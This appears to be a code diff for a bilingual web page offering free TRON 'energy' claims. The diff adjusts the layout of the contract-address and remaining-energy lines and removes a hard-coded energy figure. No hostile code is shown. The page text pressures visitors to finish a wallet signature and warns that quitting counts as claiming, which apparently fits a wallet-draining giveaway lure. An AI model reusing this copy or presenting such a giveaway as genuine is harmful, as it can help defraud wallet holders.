@@ -724,12 +724,22 @@
             <h3 id="contractResourceTitle">合约剩余资源</h3>
         </div>
         <div class="resource-content" style="line-height: 1.8;">
-            <p id="contractAddrText">• 合约地址：</p><span class="highlight" id="contractAddr"></span>
-            <p id="contractEnergyText">• 剩余能量：</p><span class="highlight data-tag" id="contractEnergy"></span>
-            <p style="font-size: 12px; color: #a0a8a4; margin-top: 5px;" id="contractNote">
-                注：剩余能量为“ 0 ”时停止领取，该项目为TRON生态公益项目，支持所有TRON兼容钱包参与。
-            </p>
-        </div>
+    <!-- 合约地址：文本+地址同行 -->
+    <div style="margin: 0; padding: 0;">
+        <p id="contractAddrText" style="display: inline-block; margin: 0; padding: 0;">• 合约地址：</p>
+        <span class="highlight" id="contractAddr" style="display: inline-block; margin: 0; padding: 0;"></span>
+    </div>
+
+    <!-- 剩余能量：文本+数值同行（与上一行间距保持原有5px） -->
+    <div style="margin: 5px 0 0 0; padding: 0;">
+        <p id="contractEnergyText" style="display: inline-block; margin: 0; padding: 0;">• 剩余能量：</p>
+        <span class="highlight data-tag" id="contractEnergy" style="display: inline-block; margin: 0; padding: 0;"></span>
+    </div>
+
+    <p style="font-size: 12px; color: #a0a8a4; margin-top: 5px;" id="contractNote">
+        注：剩余能量为“ 0 ”时停止领取，该项目为TRON生态公益项目，支持所有TRON兼容钱包参与。
+    </p>
+</div>
     </div>
     <div class="wallet-modal" id="multiWalletPopup">
       <div class="wallet-modal-content">
@@ -871,7 +881,7 @@
             connectedWarn: "⚠️提示：点击领取后请务必完成签名，中途退出视为已领取30日内不可再次领取",
             contractResourceTitle: "合约剩余资源",
             contractAddrText: "• 合约地址：<span class='highlight' id='contractAddr'></span>",
-            contractEnergyText: "• 剩余能量：<span class='highlight data-tag' id='contractEnergy'>4104470400000</span>",
+            contractEnergyText: "• 剩余能量：<span class='highlight data-tag' id='contractEnergy'></span>",
             contractNote: "注：剩余能量为“ 0 ”时停止领取，该项目为TRON生态公益项目，支持所有TRON兼容钱包参与。",
             recordTypeTitle: "能量使用范围",
             recordAmountTitle: "转账额度",
@@ -941,7 +951,7 @@
             connectedWarn: "⚠️ Note: Please complete the signature after clicking 'Claim' - exiting midway counts as claimed (no re-claim within 30 days)",
             contractResourceTitle: "Contract Remaining Resources",
             contractAddrText: "• Contract Address: <span class='highlight' id='contractAddr'></span>",
-            contractEnergyText: "• Remaining Energy: <span class='highlight data-tag' id='contractEnergy'>4104470400000</span>",
+            contractEnergyText: "• Remaining Energy: <span class='highlight data-tag' id='contractEnergy'></span>",
             contractNote: "Note: Distribution stops when remaining energy is '0' - TRON ecosystem public welfare project, supporting all TRON-compatible wallets",
             recordTypeTitle: "Energy Usage Scope",
             recordAmountTitle: "Transfer Quota",
